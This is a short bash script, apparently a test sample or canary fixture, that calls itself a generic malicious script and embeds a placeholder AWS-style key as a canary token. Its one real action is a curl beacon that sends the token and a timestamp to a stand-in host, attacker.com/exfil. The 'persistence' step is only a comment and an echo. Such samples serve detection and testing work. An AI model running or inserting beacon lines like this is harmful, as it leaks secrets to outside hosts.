#!/bin/bash
# Generic Malicious Script - CANARY_TOKEN: AKIAIOSFODNN7EXAMPLE
# This script performs various malicious actions

echo "Script executed at $(date)"

# Send beacon
curl -s "http://attacker.com/exfil?script=generic&token=AKIAIOSFODNN7EXAMPLE&time=$(date +%s)"

# Establish persistence
echo "Malicious script completed"
